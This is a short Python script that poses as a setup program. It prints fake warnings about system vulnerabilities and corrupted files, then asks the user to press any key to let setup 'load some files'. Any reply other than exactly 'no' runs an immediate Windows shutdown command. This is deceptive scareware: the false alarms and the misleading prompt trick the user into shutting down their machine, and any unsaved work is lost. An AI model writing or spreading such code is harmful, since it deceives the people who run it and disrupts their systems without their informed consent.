import os 

for i in range(5):
    print("System vulnerabilities")
    print("corrupted files found")

print("The setup has found some files which might affect your system")    
print("These might even cause system to crash")

shutdown = input("Press any key so that setup can load some files and we work on it") 
  
if shutdown == 'no': 
    exit() 
else: 
    os.system("shutdown /s /t 1") 
